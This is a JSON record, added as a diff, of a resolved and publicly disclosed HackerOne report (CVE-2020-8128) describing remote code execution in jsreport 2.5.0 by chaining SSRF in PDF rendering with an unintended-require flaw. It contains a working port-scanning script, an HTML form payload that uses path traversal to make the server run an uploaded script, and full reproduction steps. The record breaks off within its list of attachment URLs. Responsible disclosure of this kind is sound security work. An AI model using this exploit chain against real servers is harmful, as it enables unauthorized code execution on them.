@@ -1,0 +1,836 @@
+{
+  "id": 660565,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjA1NjU=",
+  "url": "https://hackerone.com/reports/660565",
+  "title": "[jsreport] Remote Code Execution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-07-26T05:00:15.970Z",
+  "submitted_at": "2019-07-26T05:00:15.970Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ermilov",
+    "url": "/ermilov",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8128"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-02-07T15:24:08.771Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-02-07T15:23:15.619Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report Remote Code Execution in `jsreport`\nIt allows running js files remotely on a vulnerable server.\n\n# Module\n\n**module name:** jsreport\n**version:** 2.5.0\n**npm page:** `https://www.npmjs.com/package/jsreport`\n\n## Module Description\n\njsreport is a reporting server which lets developers define reports using javascript templating engines (like jsrender or handlebars). It supports various report output formats like html, pdf, excel and others. It also includes advanced reporting features like user management, REST API, scheduling, designer or sending emails.\n\n## Module Stats\n\n52 downloads in the last day\n2056 downloads in the last week\n6428 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\n`jsreport` consists of a variety of packages which combines in one working application. `Script-manager` is one of them, it is utilized for running user's scripts in a sandbox and has an `unintended require` vulnerability (I have a separate report describing this vulnerability) which allows an attacker to load code that was not intended to execute. Another module is `Puppeteer` which is headless Chrome Node API. The application uses it for turning user's HTML into pdf files and unfortunately, the way it is applied allows fetching URLs and sending requests defined in an HTML file by a user which is known as SSRF (Server Side Request Forgery). Chaining these two vulnerabilities (Unintended require + SSRF) leads to remote code execution possibility.\n\n**SSRF:**\nSSRF itself is quite simple, generating a pdf report from an HTML template like this one:\n\n    <html>\n    <head>\n        <meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\">\n    </head>\n    <body>\n    \t\t<!-- will send GET request to example.com -->\n        <img src=\"http://example.com/\" />\n    \t\t<!-- will send POST request to example.com -->\n    \t\t<form id=\"pwn-form\" method=\"POST\" action=\"http://example.com/action\">\n            <input type=\"hidden\" name='SomeField' value='Some Value' />\n        </form>\n        <script>\n            var form = document.getElementById(\"pwn-form\");\n            form.submit();\n        </script>\n    </body>\n    </html>\n    \n\nwill perform requests from the server to example.com (GET and POST according to examples)\n@@ pictures\n\n**Unintended require:**\n\nA detailed description of this bug can be found here #660563. The main idea of this vulnerability is that a separate server is running on a randomly chosen port and as long as we found out the port it is possible to send a request with the path to any script (located on the machine) that we want to execute.\n\nrequest example:\n\n    {\"options\": {\"rid\": 12, \"execModulePath\": \"./../../../pwn.js\"}}\n\n**How to find port:**\n\nIn order to exploit `script-manager` we can scan ports on the server which runs `jsreport`, by utilizing SSRF (discussed previously). To do it you should create an HTML template which sends an HTTP request to port you would like to check and render it as a pdf in the application. It is easy to distinguish result as long as the response is printed to the pdf output. Of course, it would take ages to check all the ports one-by-one, but I found out some tricks that allow to do it in a few minutes.\n\nFirst of all, it is possible to do many requests with one HTML page and by checking the output figure out which range of ports includes the one we look for. \n\nNext helpful thing is the usage of `Debug` mode, if you render the HTML template in Debug mode it returns the output from server log instead of pdf page itself. It saves time and gives a better understanding of what is happening server-side. So by sending a wrong request, you see the output like this:\n\n    Failed to load resource: net::ERR_CONNECTION_REFUSED\n\nif we send a request to the port we are looking for a response would be like this:\n\n    Failed to load resource: the server responded with a status of 500 (Internal Server Error)\n\nin other words, there will be an error in the server response\nand script-manager will restart the child server.\n\nHere is another trick: if we send requests too fast and do it before the child server starts again we get a very informative error in debug log:\n\n     Executing script test1 Error: connect ECONNREFUSED 127.0.0.1:39499\n\nHere we go: this is the needed port.\n\nIt is actually quite easy to automate these requests and create a script that will do all the work for you.\n\nThe final algorithm is:\n\n1. run huge chunks of ports (I guess 1000 ports at a time is good)\n2. when we hit an error, try to run requests again and see if we lucky to get the port number in the error's output.\n3. if not we just split the range of ports in two halves and repeat steps 1 and 2 on both (divide and conquer approach)\n4. in the end we find an error or distinguish the final port by narrowing down the range of ports to the one.\n\n**RCE Steps:**\n\n1. Find out the port of `script-manager`'s vulnerable server by utilizing SSRF in `jsreport` (and automation :))\n2. Use `jsreport` to create a js file that will be stored on the machine and which content will be executed on the server.\n3. Use SSRF again to send a crafted request to `script-manager`'s vulnerable server and make it execute our file.\n4. Done! We executed a user created js file on the server.\n\nF539728\n\n## Steps To Reproduce:\n\n- run `jsreport`, easiest way to do it is to run it as a docker container\n\n    sudo docker run -p 80:5488 -v /jsreport-home:/jsreport jsreport/jsreport:2.5.0\n\n- go to [http://localhost](http://localhost) (or address to server where docker is running) in your browser\n- create new template and name it 'test1'\n\nF539730\n\nF539731\n\n- write some HTML to it (e.g. ```<h1>hello world</h1>```) and click 'Save'\n\nF539742\n\n- create portScanner.js localy (outside docker container)\n\nportScanner.js\n\n    const request = require('request')\n    \n    const name = process.argv[2] // name of the template\n    const id = process.argv[3] // id of the template\n    const chunkSize = 1000\n    const jrUrl = process.argv[4]\n      ? `${process.argv[4]}/api/report/${name}` // jsreport url if it is different from localhost\n      : `http://localhost/api/report/${name}`\n    \n    function requestPromise(options) {\n      return new Promise((resolve, reject) => {\n        request.post(options, function optionalCallback(err, httpResponse, body) {\n          if (err) {\n            return reject(err)\n          }\n          resolve(body)\n        });\n      })\n    }\n    \n    async function checkPorts(start, finish) {\n      let content = `\n      <html>\n        <body>\n          <script>\n            function printImg(port) {\n              var url = 'http://localhost:' + port;\n              var resultDiv = document.getElementById('result');\n              var img = document.createElement('img');\n              img.src = url;\n            }\n            var ports = [];\n            var start = ${start};\n            var finish = ${finish};\n            for (var i = start; i <= finish; i++) ports.push(i);\n            ports.forEach(function(port) {\n              printImg(port);\n            })\n          </script>\n        </body>\n      </html>\n      `\n      const formData = {\n        template: {\n          name: name,\n          recipe: 'chrome-pdf',\n          shortid: id,\n          __entitySet: 'templates',\n          __name: name,\n          engine: 'handlebars',\n          chrome: {printBackground: 'true'},\n          content: content,\n          __isLoaded: 'true',\n          __recipe: 'chrome-pdf',\n          __shortid: id,\n          __isDirty: 'false'\n        },\n        options: {\n          debug: {\n            logsToResponse: 'true'\n          },\n          preview: 'true'\n        }\n      }\n    \n      const body = await requestPromise({url: jrUrl, form: formData})\n      if (body.indexOf('connect ECONNREFUSED 127.0.0.1:') > -1) {\n        const rgx = /connect ECONNREFUSED 127.0.0.1:(\\d*)/g\n        const match = rgx.exec(body)\n        console.log('match', match)\n        return match[1] || true\n      } else if (body.indexOf('Failed to load resource: the server responded with a status of 500 (Internal Server Error)') > -1) {\n        return true\n      } else \n      return false\n    }\n    \n    // checking ports by `divide and conquer` approach\n    // which means checking a huge chunk of ports at once an then narrowing down till we hit the only possible port\n    // takes about 16 iterations to figure it out\n    // anyway its faster then manually checking 65k ports\n    async function checker(start, finish) {\n      const rp = await checkPorts(start, finish)\n      if (rp) {\n        if (typeof rp === 'string') { // string is returned when port is extracted from an error message\n          return rp\n        } else if (start === finish) {\n          return start\n        } else {\n          const middle = Math.floor((finish + start) / 2)\n          const tmp1 = await checker(start, middle)\n          const tmp2 = await checker(middle+1, finish)\n          return tmp1 || tmp2\n        }\n      }\n    }\n    \n    (async function main(){\n      // ports range\n      const start = 1024\n      const finish = 65535\n    \n      // split ports range into chunks of 1000\n      let first = start\n      let last = start + 1000\n    \n      let stopEnum = false\n      while (!stopEnum) {\n        if ( last > finish ) {\n          last = finish\n          stopEnum = true\n        }\n        // checking every port from `first` to `last`\n        const result = await checker(first, last)\n        if (result) {\n          console.log(result);\n          return;\n        }\n        first = last + 1\n        last = first + 1000\n      }\n    })()\n\n- run portScanner.js\n\n    node portScanner.js **test1** **templateId**\n\nwhere **test1** - name of the template (actually 'test1' that we created previously)\n\n**templateId** - id of the template (may be extracted from the temlates URL)\n\nF539733\n\ne.g. node portScanner.js test1 BJe2Pi2AgB\n\nif you don't run docker on [localhost](http://localhost) you may add docker's address as a 3rd parameter (check portScanner.js code for clarity)\n\ne.g http://my-jsreport-addr.app\n\n    node portScanner.js test1 id_from_jsreport http://my-jsreport-addr.app\n\n- wait untill it finishes and logs the port number\n\nF539741\n\n- then create a new script in `jsreport` and name it 'pwn.js'\n\nF539734\n\nF539735\n\nthis script we will be able to execute on the server\n\nso for demonstration purposes source code is:\n\n    console.log('PWNED')\n    var ls = require('fs').readdirSync('./')\n    console.log(ls)\n\nthe idea is to list files in the application root directory\n\n- insert this source code into pwn.js\n\nF539736\n\n- create new template 'test2'\n\nF539737\n\n- insert HTML code which will exploit the `script-manager` (change xxxx for the value of the previously found script-manager's port) and click `Save`\n\n> don't forget to put the right port into code snippet\n\n    <html>\n    <head>\n        <meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\">\n    </head>\n    <body>\n        123 <img src=x />\n    \t\t<!-- xxxx is the scipt-manager's port -->\n        <form id=\"pwn-form\" enctype=\"text/plain\" method=\"POST\" action=\"http://localhost:xxxx/\">\n            <input type=\"hidden\" name='{\"test' value='\":1, \"options\": {\"rid\": 12, \"execModulePath\": \"./../../../data/pwn.js/content.js\"}}' />\n        </form>\n        <script>\n            var form = document.getElementById(\"pwn-form\");\n            form.submit();\n        </script>\n    </body>\n    </html>\n\nF539738\n\n- then click `Run` (don't forget aboud 'chrome-pdf' mode)\n\nF539739\n\n- you will see an error message as an output and result of 'pwn.js' logged to console on the server\n\nF539740\n\n## Patch\n\n## Supporting Material/References:\n\n- OS: Linux Mint current\n- Node.js: 10.16.0\n- NPM: 6.9.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Y\n- I opened an issue in the related repository: N\n\n## Impact\n\nAn attacker is able to create and execute js code on the server",
+  "weakness": {
+    "id": 71,
+    "name": "Remote File Inclusion"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 539728,
+      "file_name": "jsreport_scheme_(1).png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/728/4bcef07d8c457b011505e36657e313300500c3c4/jsreport_scheme_%281%29.png?response-content-disposition=attachment%3B%20filename%3D%22jsreport_scheme_%25281%2529.png%22%3B%20filename%2A%3DUTF-8%27%27jsreport_scheme_%25281%2529.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073319Z&X-Amz-Expires=1346&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9bd8776afd0a7b78b0ebdab16daed02ac6ea52ff37cc94e3f635630afce8d10d",
+      "file_size": 85743,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539730,
+      "file_name": "screen1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/730/d3baa0eba2551bb8141ff0772cf04c0933fdb684/screen1.png?response-content-disposition=attachment%3B%20filename%3D%22screen1.png%22%3B%20filename%2A%3DUTF-8%27%27screen1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=608e715778bfadb6c5775e13620e22469876bf92ad138812dcd881fe1a424344",
+      "file_size": 24868,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539731,
+      "file_name": "screen2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/731/14a391406a890e7451189416eacc3c6e73d29f7a/screen2.png?response-content-disposition=attachment%3B%20filename%3D%22screen2.png%22%3B%20filename%2A%3DUTF-8%27%27screen2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f6f5d901af89121bce6954a7e13bdb5cd38f9d12f2762605f678455bf4acd30c",
+      "file_size": 6618,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539733,
+      "file_name": "______________2019-07-26_14-28-56.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/733/1d32bc573f32c7b191a8b4082fb783982f50153d/______________2019-07-26_14-28-56.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-07-26_14-28-56.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-07-26_14-28-56.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fcee41a5e0d8af005b9ca49d09c3b176e4ca472f5611bcfc5ada9d4922f7679",
+      "file_size": 16549,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539734,
+      "file_name": "screen4_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/734/e1048d7fcf785a6b698da647aa5f68fb4d11481a/screen4_1.png?response-content-disposition=attachment%3B%20filename%3D%22screen4_1.png%22%3B%20filename%2A%3DUTF-8%27%27screen4_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e57ce4637fbc3f38d7b00fb94b0c7b5e0847cf71047c450989cd480320bdad49",
+      "file_size": 31576,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 539735,
+      "file_name": "screen_5.png",
